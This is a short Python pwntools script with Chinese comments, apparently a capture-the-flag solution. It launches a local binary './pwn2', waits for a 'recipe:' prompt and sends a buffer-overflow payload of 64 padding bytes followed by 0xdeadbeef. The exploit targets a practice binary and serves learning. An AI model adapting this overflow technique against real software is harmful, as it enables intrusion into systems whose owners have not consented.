#!/usr/bin/env python3
from pwn import *

# 启动程序
p = process('./pwn2')

# 等待输入提示
print(p.recvuntil(b'recipe:').decode())

# 构造payload
payload = b'A' * 64 + p32(0xdeadbeef)

# 发送payload
p.sendline(payload)

# 接收并打印结果
print(p.recvall().decode())
